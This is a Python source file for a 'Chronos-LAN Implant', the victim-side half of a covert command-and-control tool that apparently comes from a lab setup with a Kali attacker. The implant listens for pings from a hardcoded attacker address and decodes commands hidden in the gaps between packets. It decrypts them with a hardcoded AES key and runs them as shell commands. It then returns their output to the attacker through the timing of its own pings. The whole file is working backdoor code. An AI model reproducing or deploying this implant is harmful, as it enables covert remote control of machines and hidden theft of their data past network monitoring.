import time
import subprocess
import threading
from scapy.all import ICMP, IP, Raw, sniff, send
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64

# ===== CONFIGURATION =====
ATTACKER_IP = "192.168.151.180"  # Attacker's IP on the same network (Kali)
MY_IP = "192.168.151.147"        # Victim's IP (Windows)

# AES Encryption - Pre-shared Key (Must match the server)
KEY = b'thisisasecretkey'  # 16 bytes for AES-128
IV = b'thisisaniv123456'   # 16 bytes

# Timing Configuration
SHORT_DELAY = 0.2   # Represents binary '0'
LONG_DELAY = 0.5    # Represents binary '1'
INTER_PACKET_DELAY = 0.8
JITTER_THRESHOLD = 0.1

# Global variables
last_rx_time = 0
rx_bit_buffer = ""
rx_capture = False
current_command = ""

def aes_encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(ct_bytes).decode()

def aes_decrypt(enc_data):
    ct = base64.b64decode(enc_data)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def send_timed_ping(target_ip, delay):
    packet = IP(dst=target_ip)/ICMP()/Raw(load="PING")
    send(packet, verbose=False)
    time.sleep(delay)

def send_message_binary(message):
    global ATTACKER_IP
    print(f"[SENDING] {message}")
    encrypted_msg = aes_encrypt(message)
    binary_str = ''.join(format(ord(i), '08b') for i in encrypted_msg)

    # START sequence
    for bit in "0101":
        send_timed_ping(ATTACKER_IP, SHORT_DELAY if bit == "0" else LONG_DELAY)
        time.sleep(INTER_PACKET_DELAY)

    # Message bits
    for bit in binary_str:
        send_timed_ping(ATTACKER_IP, SHORT_DELAY if bit == "0" else LONG_DELAY)
        time.sleep(INTER_PACKET_DELAY)

    # STOP sequence
    for bit in "1010":
        send_timed_ping(ATTACKER_IP, SHORT_DELAY if bit == "0" else LONG_DELAY)
        time.sleep(INTER_PACKET_DELAY)

    print("[+] Message sent.")

def process_icmp_packet(packet):
    print("[*] Got ICMP packet:", packet.summary())
    global last_rx_time, rx_bit_buffer, rx_capture
    if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet[IP].src == ATTACKER_IP:
        current_time = time.time()
        if last_rx_time == 0:
            last_rx_time = current_time
            return

        time_gap = current_time - last_rx_time
        last_rx_time = current_time

        if abs(time_gap - SHORT_DELAY) < JITTER_THRESHOLD:
            bit = '0'
        elif abs(time_gap - LONG_DELAY) < JITTER_THRESHOLD:
            bit = '1'
        else:
            return

        if not rx_capture:
            rx_bit_buffer += bit
            if len(rx_bit_buffer) >= 4 and rx_bit_buffer[-4:] == '0101':
                print("[+] Received start sequence.")
                rx_capture = True
                rx_bit_buffer = ""
            return

        if rx_capture:
            rx_bit_buffer += bit
            if len(rx_bit_buffer) >= 4 and rx_bit_buffer[-4:] == '1010':
                print("[+] Received stop sequence.")
                rx_capture = False
                full_binary = rx_bit_buffer[:-4]
                rx_bit_buffer = ""
                try:
                    n = 8
                    bytes_list = [full_binary[i:i+n] for i in range(0, len(full_binary), n)]
                    encrypted_str = ''.join(chr(int(b, 2)) for b in bytes_list)
                    decrypted_command = aes_decrypt(encrypted_str)
                    print(f"[RECEIVED CMD] {decrypted_command}")
                    output = subprocess.getoutput(decrypted_command)
                    send_message_binary(output)
                except Exception as e:
                    print(f"[-] Decryption/Execution error: {e}")

def start_ping_listener():
    print(f"[*] Implant listening for commands from {ATTACKER_IP}...")
    sniff(filter=f"icmp and host {ATTACKER_IP}", prn=process_icmp_packet, store=False)

def main():
    print("[+] Chronos-LAN Implant Active on Windows.")
    listener_thread = threading.Thread(target=start_ping_listener)
    listener_thread.daemon = True
    listener_thread.start()
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
